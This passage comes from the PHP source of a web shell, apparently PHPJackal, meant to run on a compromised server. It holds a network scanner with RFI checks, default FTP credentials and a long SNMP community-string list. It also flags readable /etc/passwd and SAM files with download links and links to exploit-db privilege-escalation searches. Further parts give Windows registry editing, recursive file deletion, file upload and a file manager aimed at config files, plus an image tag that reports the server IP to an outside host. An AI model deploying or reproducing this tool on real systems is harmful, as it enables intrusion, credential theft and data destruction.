						@flush_buffers ();
						$v = trim ( $v );
						$v = str_replace ( '%RFI%', $RFI_URL, $v );
						if (strstr ( getiT ( 'http://' . $ip . '/' . $v, $headers ), 'root:' ))
							echo "<a href='http://$ip/$v' target='_blank'>http://$ip/$v</a><br />";
					}
				}
			}
			if (! empty ( $_REQUEST ['smtprelay'] )) {
				if (checkthisporT ( $ip, 25, $timeout )) {
					$res = '';
					$res = checksmtP ( $ip, $timeout );
					if ($res == 1) {
						echo "-- SMTP relay found.<br />";
						@flush_buffers ();
					}
				}
			}
			if (! empty ( $_REQUEST ['snmpscanner'] )) {
				if (checkthisporT ( $ip, 161, $timeout, 1 )) {
					$com = $_REQUEST ['com'];
					$coms = $res = '';
					if (strstr ( $com, ',' ))
						$c = explode ( ',', $com );
					else
						$c [0] = $com;
					foreach ( $c as $v ) {
						$ret = snmpchecK ( $ip, $v, $timeout );
						if ($ret)
							$coms .= " $v ";
					}
					if ($coms != '') {
						echo "-- SNMP FOUND: $coms<br />";
						@flush_buffers ();
					}
				}
			}
			if (! empty ( $_REQUEST ['ftpscanner'] ) && checkfunctioN ( 'ftp_connect' )) {
				if (checkthisporT ( $ip, 21, $timeout )) {
					$usps = explode ( ',', $_REQUEST ['userpass'] );
					foreach ( $usps as $v ) {
						$user = substr ( $v, 0, strpos ( $v, ':' ) );
						$pass = substr ( $v, strpos ( $v, ':' ) + 1 );
						if ($pass == '[BLANK]')
							$pass = '';
						if (ftpchecK ( $ip, $user, $pass, $timeout )) {
							echo "-- FTP FOUND: ($user:$pass) (<b><a href='";
							echo hlinK ( "seC=ftpc&workingdiR=" . getcwd () . "&hosT=$ip&useR=$user&pasS=$pass" );
							echo "' target='_blank'>Connect</a></b>)<br />";
							@flush_buffers ();
						}
					}
				}
			}
		}
		$time = time () - $start;
		echo "Done! ($time seconds)</pre></font>";
	} elseif (! empty ( $_REQUEST ['directoryscanner'] )) {
		$dir = file ( $_REQUEST ['dic'] );
		$host = $_REQUEST ['host'];
		$r = $_REQUEST ['r1'];
		echo "<font color=#FA0><pre>Scanning started...\n";
		for($i = 0; $i < count ( $dir ); $i ++) {
			$d = trim ( $dir [$i] );
			if ($r) {
				$adr = "http://$host/$d/";
				if (check_urL ( $adr, 'GET' )) {
					echo "Directory Found: <a href='$adr' target='_blank'>$adr</a>\n";
				}
			} else {
				$adr = "$d.$host";
				$ip = gethostbyname ( $adr );
				if ($ip != $adr) {
					echo "Subdomain Found: <a href='http://$adr' target='_blank'>$adr($ip)</a>\n";
				}
			}
		}
		echo 'Done!</pre></font>';
	} else {
		$chbox = (checkfunctioN ( 'socket_set_timeout' )) ? "<ul><li><input type=checkbox name=tcp value=1 checked> <lable>TCP</lable></li><li><input type=checkbox name=udp value=1 checked> <lable>UDP</lable></li></ul>" : '<input type="hidden" name="tcp" value="1">';
		echo '<form name=port method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Port scanner</label></div><div class="fieldwrapper"><label class="styled">Target:</label><div class="thefield"><input type="text" name="target" value="' . $host . '" size="30" /></div></div><div class="fieldwrapper"><label class="styled">From:</label><div class="thefield"><input type="number" min="1" max="65535" name="fromport" value="1" size="30" /></div></div><div class="fieldwrapper"><label class="styled">To:</label><div class="thefield"><input type="number" min="1" max="65535" name="toport" value="1024" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Options:</label><div class="thefield"><ul style="margin-top:0;"><li><label>Timeout:</label> <input type="number" min="1" name="timeout" size="5" value="2"></li>' . $chbox . '</u></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" name="portscanner" value="Scan" style="margin-left: 150px;" /></div></form><br /><form name=disc method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Discover</label></div><div class="fieldwrapper"><label class="styled">Target:</label><div class="thefield"><input type="text" name="host" value="' . $_SERVER ["HTTP_HOST"] . '" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Dictionary:</label><div class="thefield"><input type="text" name="dic" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Search for:</label><div class="thefield"><ul><li><input type=radio value=1 checked name=r1> <label>Directories</label></li><li><input type=radio name=r1 value=0> <label>Subdomains</label></li></ul></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" name="directoryscanner" value="Scan" style="margin-left: 150px;" /></div></form>';
		$host = substr ( $host, 0, strrpos ( $host, "." ) );
		$udpf = (checkfunctioN ( 'socket_set_timeout' )) ? '<li><input type=checkbox name=udppscanner value=1 checked onClick="document.security.udpf.disabled = !document.security.udpf.disabled;"> <label>UDP Port scanner:</label> <input name=udport type=text value="53,69,88,111,137,138,139,389,445" size="30"></li>' : '';
		echo '<form name=security method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Security scanner</label></div><div class="fieldwrapper"><label class="styled">From:</label><div class="thefield"><input type="text" name="from" value="' . $host . '.1" size="30" /></div></div><div class="fieldwrapper"><label class="styled">To:</label><div class="thefield"><input type="text" name="to" value="' . $host . '.255" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Options:</label><div class="thefield"><ul style="margin-top:0;"><li><input type="checkbox" value="1" name="nslookup" checked> <label>NS lookup</label></li><li><label>Timeout:</label> <input type="number" min="1" name="timeout" size="5" value="2"></li><li><input type="checkbox" value="1" name="ping" checked><label>Only scan hosts with echo reply</label></li><li><input type="checkbox" value="1" name="tracert" checked><label>Traceroute</label></li><li><input type=checkbox name=tcppscanner value=1 checked onClick="document.security.port.disabled = !document.security.port.disabled;"> <label>TCP Port scanner:</label> <input name=port type=text value="21,23,25,80,110,135,139,143,443,445,1433,3306,3389,8080,65301" size="30"></li>' . $udpf . '<li><input type=checkbox name=httpbanner value=1 checked> <label>Grab HTTP headers</label></li><li><input type=checkbox name=httpscanner value=1 checked> <label>Webserver security scanning</label></li><li><input type=checkbox name=smtprelay value=1 checked> <label>SMTP relay check</label></li>';
		if (function_exists ( 'ftp_connect' ))
			echo '<li><input type=checkbox name=ftpscanner value=1 checked onClick="document.security.userpass.disabled = !document.security.userpass.disabled;"> <label>FTP password:</label><input name=userpass type=text value="anonymous:admin@nasa.gov,ftp:ftp,Administrator:[BLANK],guest:[BLANK]" size=30></li>';
		echo '<li><input type=checkbox name=snmpscanner value=1 onClick="document.security.com.disabled = !document.security.com.disabled;" checked> <label>SNMP:</label> <input name=com type=text value="public,private,secret,cisco,write,test,guest,ilmi,ILMI,password,all private,admin,all,system,monitor,sun,agent,manager,ibm,hello,switch,solaris,OrigEquipMfr,default,world,tech,mngt,tivoli,openview,community,snmp,SNMP,none,snmpd,Secret C0de,netman,security,pass,passwd,root,access,rmon,rmon_admin,hp_admin,NoGaH$@!,router,agent_steal,freekevin,read,read-only,read-write,0392a0,cable-docsis,fubar,ANYCOM,Cisco router,xyzzy,c,cc,cascade,yellow,blue,internal,comcomcom,IBM,apc,TENmanUFactOryPOWER,proxy,core,CISCO,regional,1234,2read,4changes" size=30></li></u></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" name="securityscanner" value="Scan" style="margin-left: 150px;" /></div></form>';
	}
}
function sysinfO() {
	global $windows, $disablefunctions, $cwd, $safemode, $Resource_Dir;
	$basedir = (ini_get ( 'open_basedir' ) || strtoupper ( ini_get ( 'open_basedir' ) ) == 'ON') ? 'ON' : 'OFF';
	if (! empty ( $_SERVER ['PROCESSOR_IDENTIFIER'] ))
		$CPU = $_SERVER ['PROCESSOR_IDENTIFIER'];
	$osver = $tsize = $fsize = '';
	$ds = implode ( ' ', $disablefunctions );
	$Clock = $Resource_Dir . 'images/clock/';
	if ($windows) {
		$osver = shelL ( 'ver' );
		if (! empty ( $osver ))
			$osver = "($osver)";
		$sysroot = shelL ( "echo %systemroot%" );
		if (empty ( $sysroot ))
			$sysroot = $_SERVER ['SystemRoot'];
		if (empty ( $sysroot ))
			$sysroot = getenv ( 'windir' );
		if (empty ( $sysroot ))
			$sysroot = 'Not Found';
		if (empty ( $CPU ))
			$CPU = shelL ( 'echo %PROCESSOR_IDENTIFIER%' );
		for($i = 66; $i <= 90; $i ++) {
			$drive = chr ( $i ) . ':\\';
			if (@disk_total_space ( $drive )) {
				$fsize += disk_free_space ( $drive );
				$tsize += disk_total_space ( $drive );
			}
		}
	} else {
		if (empty ( $CPU ))
			$CPU = shelL ( 'grep "model name" /proc/cpuinfo | cut -d ":" -f2' );
		if ($CPU)
			$CPU = nl2br ( $CPU );
		$fsize = disk_free_space ( '/' );
		$tsize = disk_total_space ( '/' );
	}
	$diskper = floor ( ($fsize / $tsize) * 100 );
	$diskcolor = '; background: ';
	if ($diskper < 33)
		$diskcolor .= 'green';
	elseif ($diskper < 66 && $diskper > 33)
		$diskcolor .= 'orange';
	else
		$diskcolor .= 'red';
	$disksize = 'Used spase: ' . showsizE ( $tsize - $fsize ) . ' Free space: ' . showsizE ( $fsize ) . ' Total space: ' . showsizE ( $tsize );
	$diskspace = ($tsize) ? '<div class="progress-container" style="width: 100px" title="' . $disksize . '"><div style="width: ' . $diskper . '%' . $diskcolor . '"></div></div>' : 'Unknown';
	if (empty ( $CPU ))
		$CPU = 'Unknow';
	$os = php_uname ();
	$osn = php_uname ( 's' );
	$UID = $GID = 'Unknown';
	$cp = $clog = '';
	if (! $windows) {
		if (checkfunctioN ( 'posix_getegid' ) && checkfunctioN ( 'posix_geteuid' )) {
			$UID = posix_geteuid ();
			$GID = posix_getegid ();
			$processUser = posix_getpwuid ( posix_geteuid () );
			$cuser = $processUser ['name'];
		}
		$cp = '/usr/local/cpanel/version';
		$cv = (is_readable ( $cp )) ? trim ( file_get_contents ( $cp ) ) : '';
		$clog = (is_readable ( '/var/cpanel/accounting.log' )) ? 1 : '';
		$ker = php_uname ( 'r' );
		$o = ($osn == 'Linux') ? 'Linux+Kernel' : $osn;
		$os = 'http://www.exploit-db.com/search/?action=search&filter_platform=16" target="_blank">' . $osn . '</a>';
		$os = 'http://www.exploit-db.com/search/?action=search&filter_description=kernel&filter_platform=16" target="_blank">' . $ker . '</a>';
		$inpa = ':';
	} else {
		if (class_exists ( 'COM' )) {
			$cplace = array ();
			$obj = new COM ( "WScript.Shell" );
			$cplace ['All Users Desktop'] = $obj->SpecialFolders ( "AllUsersDesktop" );
			$cplace ['All Users StartMenu'] = $obj->SpecialFolders ( "AllUsersStartMenu" );
			$cplace ['All Users Programs'] = $obj->SpecialFolders ( "AllUsersPrograms" );
			$cplace ['All Users Startup'] = $obj->SpecialFolders ( "AllUsersStartup" );
			$cplace ['Desktop'] = $obj->SpecialFolders ( "Desktop" );
			$cplace ['Favorites'] = $obj->SpecialFolders ( "Favorites" );
			$cplace ['Fonts'] = $obj->SpecialFolders ( "Fonts" );
			$cplace ['My Documents'] = $obj->SpecialFolders ( "MyDocuments" );
			$cplace ['NetHood'] = $obj->SpecialFolders ( "NetHood" );
			$cplace ['PrintHood'] = $obj->SpecialFolders ( "PrintHood" );
			$cplace ['Recent'] = $obj->SpecialFolders ( "Recent" );
			$cplace ['SendTo'] = $obj->SpecialFolders ( "SendTo" );
			$cplace ['StartMenu'] = $obj->SpecialFolders ( "StartMenu" );
			$cplace ['Startup'] = $obj->SpecialFolders ( "Startup" );
			$cplace ['Templates'] = $obj->SpecialFolders ( "Templates" );
		}
		$cuser = get_current_user ();
		$sam = $sysroot . "\\system32\\config\\SAM";
		$inpa = ';';
		$os = 'http://www.exploit-db.com/search/?action=search&filter_description=privilege+escalation&filter_platform=45" target="_blank">' . $osn . '</a>';
	}
	$AM = '';
	if (empty ( $cuser ))
		$cuser = 'Unknow';
	if (checkfunctioN ( 'apache_get_modules' )) {
		$am = implode ( ', ', apache_get_modules () );
		$AM = ($am) ? '<div class="fieldwrapper"><label class="styled">Apache modules:</label><div class="thefield"><span>' . $am . '</span></div></div>' : '';
	}
	echo '<br /><br /><div class="fieldwrapper"><label class="styled" style="width:320px">Server information</label></div><div class="fieldwrapper"><label class="styled">Server:</label><div class="thefield"><span>';
	if (! empty ( $_SERVER ['SERVER_ADDR'] ))
		echo '<img src="http://nima.my3gb.com/PHPJackal/info/?ip=' . $_SERVER ['SERVER_ADDR'] . '" border="0" /> ';
	echo $_SERVER ['HTTP_HOST'];
	if (! empty ( $_SERVER ['SERVER_ADDR'] )) {
		echo '(<a href="' . hlinK ( "seC=tools&serveR=whois.geektools.com&domaiN=" . $_SERVER ['SERVER_ADDR'] ) . '">' . $_SERVER ['SERVER_ADDR'] . '</a>)';
	}
	echo '</span></div></div><div class="fieldwrapper"><label class="styled">Operation system:</label><div class="thefield"><span><a href="' . $os . $osver . '</span></div></div>
<div class="fieldwrapper"><label class="styled">Web server:</label><div class="thefield"><span>' . $_SERVER ['SERVER_SOFTWARE'] . '</span></div></div>' . $AM . '<div class="fieldwrapper"><label class="styled">CPU:</label><div class="thefield"><span>' . $CPU . '</span></div></div>';
	if ($diskspace != 'Unknown')
		echo '<div class="fieldwrapper"><label class="styled">Disk space:</label><span>' . $diskspace . '</span></div></div>';
	if (! empty ( $_SERVER ['USERDOMAIN'] ))
		echo '<div class="fieldwrapper"><label class="styled">User domain:</label><div class="thefield"><span>' . $_SERVER ['USERDOMAIN'] . '</span></div></div>';
	if ($cuser != 'Unknow')
		echo '<div class="fieldwrapper"><label class="styled">Username:</label><div class="thefield"><span>' . $cuser . '</span></div></div>';
	if ($windows) {
		echo '
		<div class="fieldwrapper"><label class="styled">Windows directory:</label><div class="thefield"><span><a href="' . hlinK ( "seC=fm&workingdiR=$sysroot" ) . '">' . $sysroot . '</a></span></div></div>';
		if (isset ( $cplace )) {
			foreach ( $cplace as $k => $v ) {
				echo '<div class="fieldwrapper"><label class="styled">' . $k . ':</label><div class="thefield"><span><a href="' . hlinK ( "seC=fm&workingdiR=$v" ) . '">' . $v . '</a></span></div></div>';
			}
		}
		if (is_readable ( ($sam) ))
			echo '<div class="fieldwrapper"><label class="styled">SAM file:</label><div class="thefield"><span><a href="' . hlinK ( "?downloaD=$sysroot\\system32\\config\\sam" ) . '">Readable</a></span></div></div>';
	} else {
		if (is_numeric ( $UID ) || is_numeric ( $GID ))
			echo '<div class="fieldwrapper"><label class="styled">UID - GID:</label><div class="thefield"><span>' . $UID . ' - ' . $GID . '</span></div></div>';
		if (is_readable ( '/etc/passwd' ))
			echo '<div class="fieldwrapper"><label class="styled">Passwd file:</label><div class="thefield"><span><a href="' . hlinK ( "seC=openit&namE=/etc/passwd&workingdiR=$cwd" ) . '">Readable</a></span></div></div>';
		if (! empty ( $cv ) && ! empty ( $clog ))
			echo '<div class="fieldwrapper"><label class="styled">cPanel:</label><div class="thefield"><span>' . $cv . ' (Log file:  <a  href="' . hlinK ( "seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd" ) . '">Readable</a>)</span></div></div>';
	}
	echo '<div class="fieldwrapper"><label class="styled">PHP:</label><div class="thefield"><span>' . PHP_VERSION . '(<a href="' . hlinK ( "seC=phpinfo&workingdiR=$cwd" ) . '" target="_blank">more...</a>).</span>
</div></div><div class="fieldwrapper"><label class="styled">Zend version:</label><div class="thefield">
<span>';
	if (checkfunctioN ( 'zend_version' ))
		echo  zend_version ();
	else
		echo 'Not Found';
	echo '</span>
</div></div><div class="fieldwrapper">
<label class="styled">Include path:</label>
<div class="thefield">
<span>' . str_replace ( $inpa, ' ', DEFAULT_INCLUDE_PATH ) . '</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">PHP Modules:</label>
<div class="thefield">
<span>';
	$ext = get_loaded_extensions ();
	foreach ( $ext as $v ) {
		$i = phpversion ( $v );
		if (! empty ( $i ))
			$i = "($i)";
		$l = hlinK ( "exT=$v" );
		echo "[<a href='javascript:void(0)' onclick=\"window.open('$l','','width=300,height=200,scrollbars=yes')\">$v $i</a>] ";
	}
	echo '</span>
</div>
</div>';
	if (! empty ( $ds ))
		echo '
<div class="fieldwrapper">
<label class="styled">Disabled functions:</label>
<div class="thefield">
<span>' . $ds . '</span>
</div>
</div>';
	echo '
<div class="fieldwrapper">
<label class="styled">Safe-mode:</label>
<div class="thefield">
<span>' . $safemode . '</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Open base dir:</label>
<div class="thefield">
<span>' . $basedir . '</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">DBMS:</label>
<div class="thefield">
<span>';
	$sq = '';
	if (checkfunctioN ( 'mysql_connect' ))
		$sq = 'MySQL ';
	if (checkfunctioN ( 'mssql_connect' ))
		$sq .= 'MSSQL ';
	if (checkfunctioN ( 'ora_logon' ))
		$sq .= 'Oracle ';
	if (checkfunctioN ( 'sqlite_open' ))
		$sq .= 'SQLite ';
	if (checkfunctioN ( 'pg_connect' ))
		$sq .= 'PostgreSQL ';
	if (checkfunctioN ( 'msql_connect' ))
		$sq .= 'mSQL ';
	if (checkfunctioN ( 'mysqli_connect' ))
		$sq .= 'MySQLi ';
	if (checkfunctioN ( 'ovrimos_connect' ))
		$sq .= 'Ovrimos SQL ';
	if ($sq == '')
		$sq = 'Nothing';
	echo $sq . '</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Time:</label>
<div class="thefield">
<span><div title="Local">
<img src="' . $Clock . '8.png" name="hr1" border="0" />
<img src="' . $Clock . '8.png" name="hr2" border="0" />
<img src="' . $Clock . 'c.png" border="0" />
<img src="' . $Clock . '8.png" name="mn1" border="0" />
<img src="' . $Clock . '8.png" name="mn2" border="0" />
<img src="' . $Clock . 'c.png" border="0" />
<img src="' . $Clock . '8.png" name="se1" border="0" />
<img src="' . $Clock . '8.png" name="se2" border="0" />
<img src="' . $Clock . 'pm.png" name="ampm" border="0" />
</div>
<div title="Server">
<img src="' . $Clock . '8.png" name="shr1" border="0" />
<img src="' . $Clock . '8.png" name="shr2" border="0" />
<img src="' . $Clock . 'c.png" border="0" />
<img src="' . $Clock . '8.png" name="smn1" border="0" />
<img src="' . $Clock . '8.png" name="smn2" border="0" />
<img src="' . $Clock . 'c.png" border="0" />
<img src="' . $Clock . '8.png" name="sse1" border="0" />
<img src="' . $Clock . '8.png" name="sse2" border="0" />
<img src="' . $Clock . 'pm.png" name="sampm" border="0" />
</span>
</div>
</div>
</div>
<script type="text/javascript">
dg0=new Image();dg0.src="' . $Clock . '0.png";
dg1=new Image();dg1.src="' . $Clock . '1.png";
dg2=new Image();dg2.src="' . $Clock . '2.png";
dg3=new Image();dg3.src="' . $Clock . '3.png";
dg4=new Image();dg4.src="' . $Clock . '4.png";
dg5=new Image();dg5.src="' . $Clock . '5.png";
dg6=new Image();dg6.src="' . $Clock . '6.png";
dg7=new Image();dg7.src="' . $Clock . '7.png";
dg8=new Image();dg8.src="' . $Clock . '8.png";
dg9=new Image();dg9.src="' . $Clock . '9.png";
dgam=new Image();dgam.src="' . $Clock . 'am.png";
dgpm=new Image();dgpm.src="' . $Clock . 'pm.png";
sh=';
	echo date ( 'G' );
	echo '+100;
sm=';
	echo date ( 'i' );
	echo '+100;
ss=';
	echo date ( 's' );
	echo '+100;
function ltime(){
theTime=setTimeout("ltime()",1000);
d = new Date();
hr= d.getHours()+100;
mn= d.getMinutes()+100;
se= d.getSeconds()+100;
if(hr==100){hr=112;am_pm="am";}
else if(hr<112){am_pm="am";}
else if(hr==112){am_pm="pm";}
else if(hr>112){am_pm="pm";hr=(hr-12);}
tot=""+hr+mn+se;
document.hr1.src = "' . $Clock . '"+tot.substring(1,2)+".png";
document.hr2.src = "' . $Clock . '"+tot.substring(2,3)+".png";
document.mn1.src = "' . $Clock . '"+tot.substring(4,5)+".png";
document.mn2.src = "' . $Clock . '"+tot.substring(5,6)+".png";
document.se1.src = "' . $Clock . '"+tot.substring(7,8)+".png";
document.se2.src = "' . $Clock . '"+tot.substring(8,9)+".png";
document.ampm.src= "' . $Clock . '"+am_pm+".png";
}
function stime(){
theTime=setTimeout("stime()",1000);
ss++;
if(sh==100){sh=112;am_pm="am";}
else if(sh<112){am_pm="am";}
else if(sh==112){am_pm="pm";}
else if(sh>112){am_pm="pm";sh=(sh-12);}
if(ss==160){ss=100; sm++;}if(sm==160){sm=100; sh++;}
tot=""+sh+sm+ss;
document.shr1.src = "' . $Clock . '"+tot.substring(1,2)+".png";
document.shr2.src = "' . $Clock . '"+tot.substring(2,3)+".png";
document.smn1.src = "' . $Clock . '"+tot.substring(4,5)+".png";
document.smn2.src = "' . $Clock . '"+tot.substring(5,6)+".png";
document.sse1.src = "' . $Clock . '"+tot.substring(7,8)+".png";
document.sse2.src = "' . $Clock . '"+tot.substring(8,9)+".png";
document.sampm.src= "' . $Clock . '"+am_pm+".png";
}
ltime();
stime();
</script>
';
}
function checksuM($file) {
	echo "<pre>MD5: " . md5_file ( $file ) . "\r\nSHA1: " . sha1_file ( $file ) . "</pre>";
}
function reg_reaD($str) {
	$obj = new COM ( 'WScript.Shell' );
	if (is_object ( $obj ))
		return $obj->RegRead ( $str );
	return false;
}
function reg_writE($str, $value, $type) {
	$obj = new COM ( 'WScript.Shell' );
	if (is_object ( $obj ))
		$obj->RegWrite ( $str, $value, $type );
}
function reg_deletE($str) {
	$obj = new COM ( 'WScript.Shell' );
	if (is_object ( $obj ))
		$obj->RegDelete ( $str );
}
function regediT() {
	global $hcwd;
	$reg = (! empty ( $_REQUEST ['reG'] )) ? $_REQUEST ['reG'] : 'HKEY_CURRENT_USER\\Volatile Environment\\USERNAME';
	$type = (! empty ( $_REQUEST ['typE'] )) ? $_REQUEST ['typE'] : 'REG_SZ';
	if (! empty ( $_REQUEST ['rdeL'] ))
		reg_deletE ( $reg );
	if (! empty ( $_REQUEST ['radD'] ) && ! empty ( $_REQUEST ['valuE'] ) && ! empty ( $_REQUEST ['typE'] ))
		reg_writE ( $reg, $_REQUEST ['valuE'], $_REQUEST ['typE'] );
	if (! empty ( $_REQUEST ['rreaD'] ) && empty ( $_REQUEST ['rdeL'] ))
		reg_reaD ( $reg );
	$value = reg_reaD ( $reg );
	echo '
<form name=client method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">Windows Registry:</label>
</div><div class="fieldwrapper">
<label class="styled">Key:</label>
<div class="thefield"><input type="text" name="reG" value="' . htmlspecialchars ( $reg ) . '" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Value:</label>
<div class="thefield"><input type="text" name="valuE" value="' . htmlspecialchars ( $value ) . '" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Type:</label>
<div class="thefield"><input type="text" name="typE" value="' . htmlspecialchars ( $type ) . '" />
</div>
</div>' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" name="rreaD" value="Read" style="margin-left: 150px;" /><br />
<input type="submit" name="radD" value="Write" style="margin-left: 150px;" /><br />
<input type="submit" name="rdeL" value="Delete" style="margin-left: 150px;" /><br />
</div></form>
';
}

function listdiR($cwd, $task) {
	$c = getcwd ();
	$dh = opendir ( $cwd );
	while ( $cont = readdir ( $dh ) ) {
		if ($cont == '.' || $cont == '..')
			continue;
		$adr = $cwd . DIRECTORY_SEPARATOR . $cont;
		switch ($task) {
			case '0' :
				if (is_file ( $adr ))
					echo "[<a href='" . hlinK ( "seC=edit&filE=$adr&workingdiR=$c" ) . "'>$adr</a>]\n";
				if (is_dir ( $adr ))
					echo "[<a href='" . hlinK ( "seC=fm&workingdiR=$adr" ) . "'>$adr</a>]\n";
				break;
			case '1' :
				if (is_writeable ( $adr )) {
					if (is_file ( $adr ))
						echo "[<a href='" . hlinK ( "seC=edit&filE=$adr&workingdiR=$c" ) . "'>$adr</a>]\n";
					if (is_dir ( $adr ))
						echo "[<a href='" . hlinK ( "seC=fm&workingdiR=$adr" ) . "'>$adr</a>]\n";
				}
				break;
			case '2' :
				if (is_file ( $adr ) && is_writeable ( $adr ))
					echo "[<a href='" . hlinK ( "seC=edit&filE=$adr&workingdiR=$c" ) . "'>$adr</a>]\n";
				break;
			case '3' :
				if (is_dir ( $adr ) && is_writeable ( $adr ))
					echo "[<a href='" . hlinK ( "seC=fm&workingdiR=$adr" ) . "'>$adr</a>]\n";
				break;
			case '4' :
				if (is_file ( $adr ))
					echo "[<a href='" . hlinK ( "seC=edit&filE=$adr&workingdiR=$c" ) . "'>$adr</a>]\n";
				break;
			case '5' :
				if (is_dir ( $adr ))
					echo "[<a href='" . hlinK ( "seC=fm&workingdiR=$adr" ) . "'>$adr</a>]\n";
				break;
			case '6' :
				if (preg_match ( '@' . $_REQUEST ['search'] . '@', $cont ) || (is_file ( $adr ) && preg_match ( '@' . $_REQUEST ['search'] . '@', file_get_contents ( $adr ) ))) {
					if (is_file ( $adr ))
						echo "[<a href='" . hlinK ( "seC=edit&filE=$adr&workingdiR=$c" ) . "'>$adr</a>]\n";
					if (is_dir ( $adr ))
						echo "[<a href='" . hlinK ( "seC=fm&workingdiR=$adr" ) . "'>$adr</a>]\n";
				}
				break;
			case '7' :
				if (strstr ( $cont, $_REQUEST ['search'] ) || (is_file ( $adr ) && strstr ( file_get_contents ( $adr ), $_REQUEST ['search'] ))) {
					if (is_file ( $adr ))
						echo "[<a href='" . hlinK ( "seC=edit&filE=$adr&workingdiR=$c" ) . "'>$adr</a>]\n";
					if (is_dir ( $adr ))
						echo "[<a href='" . hlinK ( "seC=fm&workingdiR=$adr" ) . "'>$adr</a>]\n";
				}
				break;
			case '8' :
				{
					if (is_dir ( $adr ))
						rmdir ( $adr );
					else
						unlink ( $adr );
					rmdir ( $cwd );
					break;
				}
		}
		if (is_dir ( $adr ))
			listdiR ( $adr, $task );
	}
}
function permS($perms) {
	if (($perms & 0xC000) == 0xC000) {
		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
		$info = 'p';
	} else {
		$info = 'u';
	}
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function perm2coloR($file, $text) {
	$c = "302217";
	if (is_writeable ( $file ))
		$c = '006400';
	elseif (! is_readable ( $file ))
		$c = '990000';
	return "<font  color='#$c'>$text</font>";
}
if (! checkfunctioN ( 'posix_getpwuid' )) {
	function posix_getpwuid($u) {
		return 0;
	}
}
if (! checkfunctioN ( 'posix_getgrgid' )) {
	function posix_getgrgid($g) {
		return 0;
	}
}
function filemanageR() {
	global $windows, $cwd, $hcwd, $Resource_Dir;
	$cfg = array ('wp-config.php', 'config.php', 'configuration.php' );
	if (! empty ( $_REQUEST ['task'] )) {
		if (! empty ( $_REQUEST ['search'] ))
			$_REQUEST ['task'] = 7;
		if (! empty ( $_REQUEST ['re'] ))
			$_REQUEST ['task'] = 6;
		echo '<font color=#FA0><pre>';
		listdiR ( $cwd, $_REQUEST ['task'] );
		echo '</pre></font>';
	} else {
		if (! empty ( $_REQUEST ['cP'] ) || ! empty ( $_REQUEST ['mV'] ) || ! empty ( $_REQUEST ['rN'] )) {
			if (! empty ( $_REQUEST ['cP'] ) || ! empty ( $_REQUEST ['mV'] )) {
				$title = 'Destination';
				$ad = (! empty ( $_REQUEST ['cP'] )) ? $_REQUEST ['cP'] : $_REQUEST ['mV'];
				$dis = (! empty ( $_REQUEST ['cP'] )) ? 'Copy' : 'Move';
			} else {
				$ad = $_REQUEST ['rN'];
				$title = 'New name';
				$dis = 'Rename';
			}
			if (empty ( $_REQUEST ['deS'] )) {
				echo '<table border="0" cellspacing="0" cellpadding="0"><tr><th>' . $title . ':</th></tr><tr><td><form method="POST"><input type=text value="';
				if (empty ( $_REQUEST ['rN'] ))
					echo $cwd;
				echo '" size="60" name="deS"></td></tr><tr><td>' . $hcwd . '<input type="hidden" value="' . htmlspecialchars ( $ad ) . '" name="cp"><div class="buttonsdiv"><input type="submit" value="' . $dis . '"></div></form></table>';
			} else {
				if (! empty ( $_REQUEST ['rN'] ))
					rename ( $ad, $_REQUEST ['deS'] );
				else {
					copy ( $ad, $_REQUEST ['deS'] );
					if (! empty ( $_REQUEST ['mV'] ))
						unlink ( $ad );
				}
			}
		}
		if (! empty ( $_REQUEST ['deL'] )) {
			if (is_dir ( $_REQUEST ['deL'] ))
				listdiR ( $_REQUEST ['deL'], 8 );
			else
				unlink ( $_REQUEST ['deL'] );
		}
		if (! empty ( $_FILES ['uploadfile'] )) {
			move_uploaded_file ( $_FILES ['uploadfile'] ['tmp_name'], $_FILES ['uploadfile'] ['name'] );
			echo "<b>Uploaded!</b> File name: " . $_FILES ['uploadfile'] ['name'] . " File size: " . $_FILES ['uploadfile'] ['size'] . "<br />";
		}
		$select = "<select onChange='document.location=this.options[this.selectedIndex].value;'><option value='" . hlinK ( "seC=fm&workingdiR=$cwd" ) . "'>--------</option><option value='";
		if (! empty ( $_REQUEST ['newf'] )) {
			if (! empty ( $_REQUEST ['newfile'] )) {
				file_put_contents ( $_REQUEST ['newf'], '' );
			}
			if (! empty ( $_REQUEST ['newdir'] )) {
				mkdir ( $_REQUEST ['newf'] );
			}
		}
		if ($windows) {
			echo '<table border="0" cellspacing="0" cellpadding="0"><tr><td><b>Drives: </b>';
